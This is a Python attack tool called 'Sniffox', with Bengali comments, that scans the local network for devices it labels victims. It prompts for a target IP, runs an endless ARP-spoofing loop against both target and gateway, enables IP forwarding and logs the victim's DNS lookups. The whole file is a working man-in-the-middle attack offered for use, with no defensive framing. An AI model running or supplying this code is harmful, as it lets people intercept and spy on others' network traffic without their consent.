import scapy.all as scapy
import time
import sys
import os
import subprocess
import re
import xml.etree.ElementTree as ET
import threading
from colorama import Fore, Style, init

init(autoreset=True)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    fox_face = f"""
{Fore.RED}              /\\     /\\
{Fore.RED}             {{  `---'  }}
{Fore.RED}             {{  {Fore.WHITE}O   O{Fore.RED}  }}
{Fore.YELLOW}             ~~>  V  <~~
{Fore.RED}              \\  \\|/  /
{Fore.RED}               `-----'__
{Fore.RED}               /      \\  `^\\_
{Fore.RED}              {{        }}\\ |\\_\\_   {Fore.YELLOW}W
{Fore.RED}              |  \\_/  |/ /  \\_\\_({Fore.WHITE} {Fore.RED})
{Fore.RED}               \\__/  /(_E      \\__/
{Fore.RED}                 (  /
{Fore.RED}                  MM
    """
    text_banner = f"""
{Fore.YELLOW} ███████ ███    ██ ██ ███████ ███████  ██████  ██   ██
{Fore.YELLOW} ██      ████   ██ ██ ██      ██      ██    ██ ██  ██
{Fore.WHITE} ███████ ██ ██  ██ ██ █████   █████   ██    ██   ███
{Fore.RED}      ██ ██  ██ ██ ██ ██      ██      ██    ██  ██ ██
{Fore.RED} ███████ ██   ████ ██ ██      ██       ██████  ██   ██
    """
    print(fox_face)
    print(text_banner)
    print(f"{Fore.CYAN}  >> {Fore.WHITE}Developer : {Fore.GREEN}Cyberlatchofficial {Fore.CYAN}<<")
    print(f"{Fore.RED} -----------------------------------------------------------")

def get_network_details():
    try:
        route_output = subprocess.check_output("ip route | grep default", shell=True).decode()
        gateway_ip = re.search(r'via (\d+\.\d+\.\d+\.\d+)', route_output).group(1)
        interface = re.search(r'dev (\S+)', route_output).group(1)
        my_ip_output = subprocess.check_output(f"ip addr show {interface} | grep 'inet '", shell=True).decode()
        my_ip = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', my_ip_output).group(1)
        network_range = ".".join(gateway_ip.split(".")[:-1]) + ".0/24"
        
        print(f"{Fore.CYAN}[ STATS ] {Fore.WHITE}Default Gateway : {Fore.YELLOW}{gateway_ip}")
        print(f"{Fore.CYAN}[ STATS ] {Fore.WHITE}Your Local IP   : {Fore.YELLOW}{my_ip}")
        print(f"{Fore.RED} -----------------------------------------------------------")
        return gateway_ip, interface, network_range, my_ip
    except:
        sys.exit(f"{Fore.RED}[!] Error Fetching Network.")

def extreme_nmap_scan(network_range, gateway_ip, my_ip, interface):
    # আপনার রিকোয়েস্ট অনুযায়ী স্ক্যানিং ইঞ্জিনকে চরম শক্তিশালী করা হয়েছে
    print(f"{Fore.YELLOW}[*] Force-Waking all devices in {network_range}...")
    
    # ব্যাকগ্রাউন্ডে ২বার নক করা যাতে ঘুমন্ত ডিভাইস জেগে উঠে (Predator logic)
    for _ in range(2):
        subprocess.Popen(f"sudo nmap -sn -T5 {network_range} > /dev/null 2>&1", shell=True)
        scapy.arping(network_range, verbose=False, timeout=1)
    
    time.sleep(3) # ডিভাইসগুলো জেগে ওঠার জন্য ৩ সেকেন্ড সময়

    print(f"{Fore.CYAN}[*] Sniffox Extreme Engine: Gathering device list...")
    print(f"{Fore.WHITE}{'-'*75}")
    print(f"{Fore.WHITE}{'IP Address':<16} | {'MAC Address':<18} | {'Vendor/Brand'}")
    print(f"{Fore.WHITE}{'-'*75}")
    
    temp_file = "sniffox_scan.xml"
    devices = {}
    
    try:
        # ৬ বার গভীর স্ক্যান করে নিশ্চিত হওয়া
        for i in range(1, 7):
            sys.stdout.write(f"\r{Fore.YELLOW}[*] Scanning Pass: {i}/6 ... ")
            sys.stdout.flush()
            
            # ARP + ICMP Combined Scan
            os.system(f"sudo nmap -sn -PR -T4 {network_range} -oX {temp_file} > /dev/null")
            
            if os.path.exists(temp_file):
                tree = ET.parse(temp_file)
                root = tree.getroot()
                for host in root.findall('host'):
                    ip = host.find("./address[@addrtype='ipv4']").get('addr')
                    # গেটওয়ে এবং নিজের আইপিকে লিস্টে দেখাবে না, শুধু ভিকটিমদের দেখাবে
                    if ip != gateway_ip and ip != my_ip:
                        mac, vendor = "Unknown", "Unknown"
                        mac_el = host.find("./address[@addrtype='mac']")
                        if mac_el is not None:
                            mac = mac_el.get('addr')
                            vendor = mac_el.get('vendor', 'Unknown')
                        if ip not in devices: devices[ip] = (mac, vendor)
            time.sleep(0.3)
            
        print(f"\n{Fore.GREEN}[+] Scan Complete! {len(devices)} active devices found (excluding you & router).\n")
        
        for ip, (mac, vendor) in sorted(devices.items()):
            print(f"{Fore.GREEN}{ip:<16} | {Fore.YELLOW}{mac:<18} | {vendor}")
                
        if os.path.exists(temp_file): os.remove(temp_file)
        return devices
    except Exception as e:
        print(f"\n{Fore.RED}[!] Scan Error: {e}")
        return {}

class SniffoxAttack:
    def __init__(self, target_ip, gateway_ip, interface, target_mac):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = target_mac

    def spoof(self, target_ip, spoof_ip, target_mac):
        packet = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(packet, verbose=False)

    def run(self, gw_mac):
        print(f"{Fore.RED}\n[!] SNIFFOX HIJACK STARTED: Intercepting {self.target_ip} ...")
        while True:
            try:
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
                self.spoof(self.gateway_ip, self.target_ip, gw_mac)
                time.sleep(2)
            except: break

if __name__ == "__main__":
    clear_screen()
    print_banner()
    os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    
    gw, iface, net_range, my_ip = get_network_details()
    
    # গেটওয়ে এবং নিজের আইপি বাদ দিয়ে ৬ বার পাওয়ারফুল স্ক্যান
    active_devices = extreme_nmap_scan(net_range, gw, my_ip, iface) 
    
    if not active_devices:
        print(f"{Fore.RED}[!] No target devices found in network.")
        sys.exit()

    target = input(f"\n{Fore.WHITE}Target Victim IP: ")
    t_data = active_devices.get(target)
    
    if t_data and t_data[0] != "Unknown":
        t_mac = t_data[0]
        # গেটওয়ে ম্যাক বের করা
        ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=gw), timeout=2, verbose=False)[0]
        gw_mac = ans[0][1].hwsrc if ans else None
        
        if gw_mac:
            attack = SniffoxAttack(target, gw, iface, t_mac)
            threading.Thread(target=attack.run, args=(gw_mac,), daemon=True).start()
            try:
                print(f"{Fore.MAGENTA}[*] Logging DNS Traffic ... (Press Ctrl+C to stop)\n")
                scapy.sniff(iface=iface, filter="udp port 53", store=False, 
                            prn=lambda x: print(f"{Fore.CYAN}[DNS LOG] Victim visited: {x[scapy.DNSQR].qname.decode()}") 
                            if x.haslayer(scapy.DNSQR) else None)
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Sniffox connection closed.")
        else:
            print(f"{Fore.RED}[!] Error: Could not resolve Gateway MAC.")
    else:
        print(f"{Fore.RED}[!] Error: Target offline or MAC not found.")
